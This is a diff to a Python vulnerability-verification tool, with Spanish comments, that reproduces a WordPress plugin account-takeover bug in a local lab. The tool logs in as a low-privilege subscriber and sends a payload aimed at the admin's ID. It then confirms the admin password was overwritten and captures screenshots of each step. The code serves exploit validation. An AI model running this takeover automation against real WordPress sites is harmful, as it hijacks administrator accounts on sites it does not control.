@@ -301,6 +301,44 @@ def _screenshot_authenticated(base_url: str, session, path: str) -> Optional[str
             pass
 
 
+def _screenshot_failed_login(base_url: str, user: str, wrong_password: str) -> Optional[str]:
+    """Automatiza el FORMULARIO real de wp-login.php (Playwright, no una peticion POST cruda) con
+    una password y captura la pantalla resultante. Se usa DESPUES del ataque, con la password
+    ORIGINAL del admin -- si el ataque de verdad la sobreescribio, WordPress debe rechazarla, y
+    esta funcion deja la pantalla de error real como prueba (no solo lo deducimos por logica).
+    Mismo patron de degradacion honesta que _screenshot_authenticated: sin Playwright, None."""
+    try:
+        from playwright.sync_api import sync_playwright
+    except Exception:
+        return None
+    import base64
+    import tempfile
+    fd, out_path = tempfile.mkstemp(suffix=".png")
+    os.close(fd)
+    try:
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(headless=True, args=["--no-sandbox"])
+            try:
+                page = browser.new_context(viewport={"width": 1280, "height": 900}).new_page()
+                page.goto(base_url + "/wp-login.php", wait_until="load", timeout=15000)
+                page.fill("#user_login", user)
+                page.fill("#user_pass", wrong_password)
+                page.click("#wp-submit")
+                page.wait_for_load_state("load", timeout=10000)
+                page.screenshot(path=out_path, full_page=True)
+            finally:
+                browser.close()
+        with open(out_path, "rb") as f:
+            return base64.b64encode(f.read()).decode("ascii")
+    except Exception:
+        return None
+    finally:
+        try:
+            os.unlink(out_path)
+        except OSError:
+            pass
+
+
 def _wp_login(base_url: str, user: str, password: str, timeout: float = 15.0):
     """Login real por cookie de WordPress (wp-login.php). Devuelve una requests.Session logueada,
     o None si no hay cookie de sesion (login fallido). Requiere la libreria `requests` (pwntools ya
@@ -399,6 +437,14 @@ def verify_wordpress_account_takeover(
             return res
         base_url = f"http://{_lab_host()}:{port}"
         step(f"WordPress listo en {base_url}; instalando core via wp-cli...")
+        # secuencia ORDENADA de capturas, una por cada paso relevante del ataque -- evidencia
+        # visual paso a paso, no solo un antes/despues. Cada entrada: {paso, pie, png_b64}.
+        shots: List[dict] = []
+
+        def capture(sess_, url_path, es_caption, en_caption):
+            png = _screenshot_authenticated(base_url, sess_, url_path)
+            if png:
+                shots.append({"caption_es": es_caption, "caption_en": en_caption, "png_b64": png})
 
         r = lab.wp_cli("core", "install", f"--url={base_url}", "--title=binoracle-lab",
                        f"--admin_user={admin_user}", f"--admin_password={admin_pass}",
@@ -408,6 +454,13 @@ def verify_wordpress_account_takeover(
             return res
         admin_id = lab.wp_cli("user", "get", admin_user, "--field=ID", timeout=30).stdout.strip()
         step(f"WordPress instalado; admin id={admin_id}")
+        step("capturando pantalla: WordPress recien instalado y en pie (laboratorio en vivo)...")
+        import requests as _requests
+        capture(_requests.Session(), "/wp-login.php",
+               "Paso 1: WordPress recien instalado y accesible (laboratorio en vivo, antes de "
+               "tocar nada).",
+               "Step 1: WordPress freshly installed and reachable (live lab, before anything "
+               "is touched).")
 
         step(f"copiando el plugin ({slug}) al volumen e instalandolo...")
         if not lab.install_plugin(plugin_source_dir, slug):
@@ -419,13 +472,32 @@ def verify_wordpress_account_takeover(
             res.limitations.append("si el slug/version descargados no coinciden con el afectado, "
                                    "la activacion puede fallar por requisitos del propio plugin")
             return res
-        step("plugin activo. Creando el usuario de bajo privilegio (subscriber)...")
+        step("plugin activo. capturando pantalla: panel de plugins como admin (el plugin "
+             "vulnerable, activo)...")
+        admin_setup_sess = _wp_login(base_url, admin_user, admin_pass)
+        if admin_setup_sess is not None:
+            capture(admin_setup_sess, "/wp-admin/plugins.php",
+                   f"Paso 2: el plugin '{slug}' instalado y ACTIVO en el laboratorio (vista del "
+                   f"admin, con su password ORIGINAL -- antes del ataque).",
+                   f"Step 2: plugin '{slug}' installed and ACTIVE in the lab (admin's view, with "
+                   f"their ORIGINAL password -- before the attack).")
+        step("Creando el usuario de bajo privilegio (subscriber)...")
 
         r = lab.wp_cli("user", "create", sub_user, "subscriber@binoracle-lab.invalid",
                        "--role=subscriber", f"--user_pass={sub_pass}", timeout=30)
         if r.returncode != 0:
             res.detail = f"creacion del subscriber fallo: {(r.stderr or r.stdout or '')[:300]}"
             return res
+        step("capturando pantalla: usuario de bajo privilegio creado de verdad (lista de "
+             "usuarios, vista admin)...")
+        if admin_setup_sess is not None:
+            capture(admin_setup_sess, "/wp-admin/users.php",
+                   f"Paso 3: cuenta '{sub_user}' creada de verdad con rol Subscriber (vista de "
+                   f"la lista de usuarios del admin) -- el unico acceso que tiene el atacante "
+                   f"antes de explotar nada.",
+                   f"Step 3: account '{sub_user}' really created with the Subscriber role (admin's "
+                   f"user list view) -- the only access the attacker has before exploiting "
+                   f"anything.")
 
         if remaining() < 30:
             res.detail = "presupuesto de tiempo agotado antes de intentar el ataque"
@@ -437,9 +509,12 @@ def verify_wordpress_account_takeover(
             res.detail = "no se pudo iniciar sesion como el usuario de bajo privilegio"
             return res
         res.logs.append(f"login subscriber: OK ({sub_user})")
-        shot = _screenshot_authenticated(base_url, sess, "/wp-admin/profile.php")
-        if shot:
-            res.evidence["screenshot_before_subscriber_png_b64"] = shot
+        step("capturando pantalla: sesion del atacante ANTES del ataque (bajo privilegio)...")
+        capture(sess, "/wp-admin/profile.php",
+               f"Paso 4: sesion real como '{sub_user}' (subscriber, bajo privilegio) -- esta "
+               f"cuenta es la unica que el atacante controla ANTES del ataque.",
+               f"Step 4: real session as '{sub_user}' (subscriber, low-privilege) -- this is the "
+               f"only account the attacker controls BEFORE the attack.")
 
         payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
         payload[id_param] = admin_id
@@ -480,10 +555,31 @@ def verify_wordpress_account_takeover(
                                             f"'{new_pass}' funciono (cookie wordpress_logged_in_* "
                                             f"presente tras el POST a wp-login.php)")
             step("VERIFICADO: el login como admin con la password nueva funciono.")
-            step("capturando pantalla del panel de WordPress ya como admin (evidencia visual)...")
-            shot = _screenshot_authenticated(base_url, confirm, "/wp-admin/")
-            if shot:
-                res.evidence["screenshot_admin_dashboard_png_b64"] = shot
+            step("capturando pantalla: panel de WordPress YA como admin, con la password "
+                 "fijada por el ataque (prueba final)...")
+            capture(confirm, "/wp-admin/",
+                   f"Paso 5: ACCOUNT TAKEOVER confirmado -- panel de administracion completo de "
+                   f"'{admin_user}', accedido con la password que el ataque del paso 4 fijo, no "
+                   f"con la password original del admin.",
+                   f"Step 5: ACCOUNT TAKEOVER confirmed -- '{admin_user}'s full admin panel, "
+                   f"accessed with the password step 4's attack set, not the admin's original "
+                   f"password.")
+            step("capturando pantalla: la password ORIGINAL del admin ya NO funciona (prueba "
+                 "de que el ataque la sobreescribio de verdad)...")
+            old_pw_shot = _screenshot_failed_login(base_url, admin_user, admin_pass)
+            if old_pw_shot:
+                shots.append({
+                    "caption_es": (f"Paso 6: intentar entrar como '{admin_user}' con su password "
+                                   f"ORIGINAL (la de antes del ataque) ahora FALLA -- WordPress "
+                                   f"rechaza el formulario real de login, prueba de que la "
+                                   f"password se sobreescribio de verdad, no que haya dos validas."),
+                    "caption_en": (f"Step 6: logging in as '{admin_user}' with their ORIGINAL "
+                                   f"password (from before the attack) now FAILS -- WordPress "
+                                   f"rejects the real login form, proof the password was really "
+                                   f"overwritten, not that two passwords are now valid."),
+                    "png_b64": old_pw_shot,
+                })
+            res.evidence["screenshots"] = shots
             return res
 
         # si no hay pass_param (solo email, p.ej.), confirma por wp-cli leyendo el email actual
@@ -495,10 +591,12 @@ def verify_wordpress_account_takeover(
             res.evidence["email_leido_tras_ataque"] = cur
             res.detail = (f"email del admin tras la peticion: {cur!r} "
                           f"(esperado: {new_email!r}) -> {'COINCIDE' if res.verified else 'no coincide'}")
+            res.evidence["screenshots"] = shots
             return res
 
         res.ok = True
         res.detail = "la peticion se envio pero no se pudo confirmar el efecto (login posterior fallo)"
+        res.evidence["screenshots"] = shots
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
